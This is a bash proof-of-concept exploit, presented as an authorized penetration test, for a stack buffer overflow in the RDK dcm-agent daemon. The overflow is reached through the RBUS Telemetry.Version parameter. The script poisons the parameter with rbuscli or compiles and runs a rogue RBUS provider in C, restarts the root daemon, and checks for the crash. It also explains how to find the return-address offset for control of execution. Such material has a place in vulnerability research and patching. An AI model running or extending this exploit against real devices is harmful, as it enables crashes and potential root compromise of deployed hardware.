#!/bin/bash
###############################################################################
# PoC: DCM-009 - Stack buffer overflow of t2_ver[32] via RBUS Telemetry.Version
#
# AUTHORIZED PENETRATION TEST - RDK dcm-agent (dcmd)
#
# ----------------------------------------------------------------------------
# VULNERABILITY SUMMARY
# ----------------------------------------------------------------------------
# File   : dcm.c:148-183  (dcmDaemonMainInit)
# Sink   : dcm_rbus.c:327 (dcmRbusGetT2Version)
#
#   INT32 dcmDaemonMainInit(DCMDHandle *pdcmHandle)
#   {
#       INT32 ret = DCM_SUCCESS;
#       INT8  t2_ver[32];                              <-- 32-byte stack buf
#       ...
#       ret = dcmRbusGetT2Version(pdcmHandle->pRbusHandle, t2_ver);
#       DCMInfo("T2 Version: %s\n", t2_ver);
#
#   INT32 dcmRbusGetT2Version(VOID *pDCMRbusHandle, VOID *pValue)
#   {
#       ...
#       rc = rbus_get(handle, DCM_RBUS_T2_VERSION, ¶mValue);
#       ...
#       stringValue = rbusValue_ToString(paramValue, NULL, 0);
#       ...
#       strcpy(t2_ver, stringValue);                   <-- UNBOUNDED COPY
#
#   #define DCM_RBUS_T2_VERSION \
#     "Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature.Telemetry.Version"
#
# Any local process that can write/provide that RBUS parameter controls the
# bytes copied onto dcmd's stack. dcmd runs as root with umask(0).
#
# ----------------------------------------------------------------------------
# OFFSET / SIZE MATH (typical AArch64/x86_64 RDK build, gcc -O2)
# ----------------------------------------------------------------------------
#   t2_ver[32]            : bytes [  0 ..  31]  -> legitimate buffer
#   INT32 ret + alignment : bytes [ 32 ..  39]  -> 4B ret + 4B pad (ordering
#                                                  is compiler-dependent;
#                                                  -fstack-protector usually
#                                                  places the char array
#                                                  CLOSEST to the canary, so
#                                                  ret may live BELOW t2_ver)
#   stack canary  (8B)    : bytes [ ~32/40 .. ] -> if -fstack-protector-strong
#   saved FP/RBP  (8B)    : next 8 bytes
#   saved LR/RIP  (8B)    : next 8 bytes        -> RETURN ADDRESS
#
#   => Writing >= 32 bytes corrupts adjacent stack data.
#   => Writing ~40-64 bytes smashes canary and/or saved FP/return address.
#   => We send 512 bytes of a De-Bruijn cyclic pattern so the exact offset
#      to PC/RIP can be recovered from the crash register dump
#      (e.g. "PC is at 0x6241316241306241" -> pattern_offset).
#
# ----------------------------------------------------------------------------
# TRIGGER
# ----------------------------------------------------------------------------
# dcmRbusGetT2Version() is invoked exactly once, during dcmDaemonMainInit(),
# i.e. at daemon STARTUP. Therefore the PoC:
#   1. Poisons the RBUS parameter (or registers a rogue provider).
#   2. Restarts dcmd.
#   3. Observes the crash (SIGSEGV / SIGABRT-stack-smashing) in logs/dmesg.
#
###############################################################################

set -u

PARAM="Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature.Telemetry.Version"
MARKER="/tmp/PWNED_DCM-009"
PAYLOAD_LEN=512

# ---------------------------------------------------------------------------
# Step 1: Generate a 512-byte cyclic De-Bruijn-style pattern (Metasploit
#          pattern_create compatible: Aa0Aa1Aa2...). Every 3-byte and 4-byte
#          subsequence is unique, so the faulting PC value uniquely identifies
#          the overwrite offset.
# ---------------------------------------------------------------------------
gen_cyclic() {
    local n=$1 out="" U L D
    for U in A B C D E F G H I J K L M N O P Q R S T U V W X Y Z; do
        for L in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
            for D in 0 1 2 3 4 5 6 7 8 9; do
                out+="${U}${L}${D}"
                if [ ${#out} -ge "$n" ]; then
                    printf '%s' "${out:0:$n}"
                    return
                fi
            done
        done
    done
}

PAYLOAD="$(gen_cyclic $PAYLOAD_LEN)"
echo "[*] Generated $PAYLOAD_LEN-byte cyclic payload (first 64B shown):"
echo "    ${PAYLOAD:0:64}..."
echo "[*] Target stack buffer is INT8 t2_ver[32]; overflow begins at byte 32."
echo "    Bytes 32-39 of pattern : '${PAYLOAD:32:8}'  (likely clobbers ret/pad or canary)"
echo "    Bytes 40-47 of pattern : '${PAYLOAD:40:8}'  (likely clobbers canary or saved FP)"
echo "    Bytes 48-55 of pattern : '${PAYLOAD:48:8}'  (likely clobbers saved FP or RIP/LR)"
echo "    Bytes 56-63 of pattern : '${PAYLOAD:56:8}'  (likely clobbers RIP/LR)"

# Save original value so we can restore it during cleanup.
ORIG_VAL=""
if command -v rbuscli >/dev/null 2>&1; then
    ORIG_VAL="$(rbuscli getv "$PARAM" 2>/dev/null | sed -n 's/.*Value[[:space:]]*:[[:space:]]*//p' | head -n1)"
    printf '%s' "$ORIG_VAL" > /tmp/DCM-009.orig_t2ver
    echo "[*] Saved original $PARAM = '${ORIG_VAL}' to /tmp/DCM-009.orig_t2ver"
fi

# ---------------------------------------------------------------------------
# Step 2: ON-DEVICE PRIMARY PATH
#          Use rbuscli to set the TR-181 RFC parameter directly. On RDK
#          devices this parameter is backed by the RFC/TR-181 provider and
#          is persisted, so the next rbus_get() from dcmd will return our
#          oversized string.
# ---------------------------------------------------------------------------
POISONED=0
if command -v rbuscli >/dev/null 2>&1; then
    echo "[*] Attempting: rbuscli setv $PARAM string \"<512B-pattern>\""
    if rbuscli setv "$PARAM" string "$PAYLOAD" 2>&1 | tee /tmp/DCM-009.setv.log | grep -qi 'succ'; then
        echo "[+] rbuscli setv succeeded -- parameter poisoned."
        POISONED=1
    else
        echo "[!] rbuscli setv failed (provider may reject writes / not present)."
        echo "    Falling back to rogue-provider mode."
    fi
else
    echo "[!] rbuscli not found on PATH -- assuming OFF-DEVICE test environment."
fi

# ---------------------------------------------------------------------------
# Step 3: FALLBACK -- ROGUE RBUS PROVIDER
#          If we cannot 'setv' the param (read-only or no existing provider),
#          register our OWN provider for it. dcmd's rbus_get() will then be
#          routed to us, and we return the oversized string.
#
#          This compiles a tiny C helper against librbus. On RDK images
#          librbus + headers live under /usr/{lib,include}/rbus.
# ---------------------------------------------------------------------------
if [ "$POISONED" -eq 0 ] && command -v rbuscli >/dev/null 2>&1; then
    cat > /tmp/DCM-009_provider.c <<'EOF'
/* Rogue RBUS provider for DCM-009.
 * Registers Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature.Telemetry.Version
 * and answers every GET with a 512-byte string -> overflows dcmd's
 * INT8 t2_ver[32] via strcpy() in dcm_rbus.c:327.
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rbus.h>

#define T2_PARAM "Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature.Telemetry.Version"

static char g_payload[600];

static rbusError_t getH(rbusHandle_t h, rbusProperty_t prop,
                        rbusGetHandlerOptions_t* o)
{
    (void)h; (void)o;
    rbusValue_t v;
    rbusValue_Init(&v);
    rbusValue_SetString(v, g_payload);   /* >> 31 bytes -> overflow */
    rbusProperty_SetValue(prop, v);
    rbusValue_Release(v);
    fprintf(stderr, "[DCM-009-provider] served %zu-byte T2 Version\n",
            strlen(g_payload));
    return RBUS_ERROR_SUCCESS;
}

int main(int argc, char** argv)
{
    if (argc > 1) {
        strncpy(g_payload, argv[1], sizeof(g_payload)-1);
    } else {
        memset(g_payload, 'A', 512);   /* default: 512 x 'A' */
    }
    g_payload[sizeof(g_payload)-1] = 0;

    rbusHandle_t h;
    if (rbus_open(&h, "DCM009_ROGUE_T2") != RBUS_ERROR_SUCCESS) {
        fprintf(stderr, "rbus_open failed\n");
        return 1;
    }
    rbusDataElement_t el[1] = {
        { T2_PARAM, RBUS_ELEMENT_TYPE_PROPERTY,
          { getH, NULL, NULL, NULL, NULL, NULL } }
    };
    if (rbus_regDataElements(h, 1, el) != RBUS_ERROR_SUCCESS) {
        fprintf(stderr, "rbus_regDataElements failed (param may already be owned)\n");
        rbus_close(h);
        return 1;
    }
    fprintf(stderr, "[DCM-009-provider] registered, serving %zu-byte payload. "
                    "Restart dcmd now.\n", strlen(g_payload));
    for (;;) sleep(60);   /* stay alive to answer GETs */
}
EOF
    echo "[*] Compiling rogue provider (requires librbus dev headers on device)..."
    if gcc -O2 -o /tmp/DCM-009_provider /tmp/DCM-009_provider.c \
           -I/usr/include/rbus -I/usr/include/rtmessage \
           -lrbus -lrbuscore -lrtMessage 2>/tmp/DCM-009.gcc.log; then
        echo "[+] Built /tmp/DCM-009_provider -- launching in background."
        /tmp/DCM-009_provider "$PAYLOAD" &
        PROVIDER_PID=$!
        echo "$PROVIDER_PID" > /tmp/DCM-009.provider.pid
        sleep 2
        POISONED=1
    else
        echo "[!] gcc build failed (see /tmp/DCM-009.gcc.log)."
        echo "    OFF-DEVICE FALLBACK: writing payload to /tmp/DCM-009.payload"
        echo "    -> Manually inject this string as the value of:"
        echo "       $PARAM"
        printf '%s\n' "$PAYLOAD" > /tmp/DCM-009.payload
    fi
fi

# Off-device: always drop the payload file for reference / manual injection.
printf '%s\n' "$PAYLOAD" > /tmp/DCM-009.payload

# ---------------------------------------------------------------------------
# Step 4: TRIGGER -- restart dcmd so dcmDaemonMainInit() runs and calls
#          dcmRbusGetT2Version() -> rbus_get(T2_VERSION) -> strcpy(t2_ver,..)
# ---------------------------------------------------------------------------
echo
echo "[*] Triggering: restarting dcmd so dcmDaemonMainInit() executes..."
if command -v systemctl >/dev/null 2>&1 && systemctl list-units 2>/dev/null | grep -q 'dcm'; then
    systemctl restart dcm-daemon.service 2>/dev/null \
        || systemctl restart dcm.service 2>/dev/null \
        || systemctl restart dcmd.service 2>/dev/null
elif command -v dcmd >/dev/null 2>&1; then
    # Kill any existing instance (it checks /tmp/.dcm-daemon.pid) then relaunch.
    pkill -x dcmd 2>/dev/null
    rm -f /tmp/.dcm-daemon.pid
    sleep 1
    ( dcmd >/tmp/DCM-009.dcmd.out 2>&1 & )
else
    echo "[!] dcmd binary not found on this host."
    echo "    On the target device, run:  systemctl restart dcm-daemon   (or)  dcmd &"
fi

sleep 3

# ---------------------------------------------------------------------------
# Step 5: VERIFY -- look for the crash signature.
#          Expected outcomes:
#            * With -fstack-protector: "*** stack smashing detected ***"
#              followed by SIGABRT in dcmd.
#            * Without protector: SIGSEGV with PC/RIP containing bytes from
#              our cyclic pattern (e.g. 0x3262413162413062 == "b0Ab1Ab2").
# ---------------------------------------------------------------------------
echo
echo "[*] Checking for crash evidence..."
HIT=0

if dmesg 2>/dev/null | tail -n 50 | grep -Ei 'dcmd.*(segfault|stack smashing|trap)' ; then
    HIT=1
fi
for LOG in /opt/logs/dcm.log /opt/logs/dcmd.log /var/log/messages /tmp/DCM-009.dcmd.out; do
    [ -r "$LOG" ] || continue
    if tail -n 80 "$LOG" 2>/dev/null | grep -E 'stack smashing|Segmentation|T2 Version: Aa0Aa1'; then
        HIT=1
    fi
done
# If dcmd printed our oversized version string before dying, that alone
# proves >31 bytes were strcpy'd into t2_ver[32].
if grep -q "T2 Version: ${PAYLOAD:0:48}" /opt/logs/*.log /tmp/DCM-009.dcmd.out 2>/dev/null; then
    echo "[+] dcmd logged a >31-byte T2 Version -> strcpy overflowed t2_ver[32]."
    HIT=1
fi

if [ "$HIT" -eq 1 ]; then
    : > "$MARKER"
    echo
    echo "[+] EXPLOIT REACHED: DCM-009 confirmed."
    echo "    Stack buffer t2_ver[32] in dcmDaemonMainInit() was overflowed by"
    echo "    $PAYLOAD_LEN bytes delivered via RBUS param:"
    echo "      $PARAM"
    echo "    Marker written: $MARKER"
    echo
    echo "    To compute the exact return-address offset, take the faulting"
    echo "    PC/RIP value from dmesg/coredump, convert to ASCII (little-endian),"
    echo "    and locate that substring in /tmp/DCM-009.payload."
else
    echo
    echo "[!] No crash evidence auto-detected on this host."
    echo "    If running OFF-DEVICE: copy /tmp/DCM-009.payload to the target,"
    echo "    set it as the value of $PARAM (rbuscli setv ... string \"\$(cat ...)\"),"
    echo "    then restart dcmd and inspect dmesg / journalctl -u dcm*."
fi

exit 0
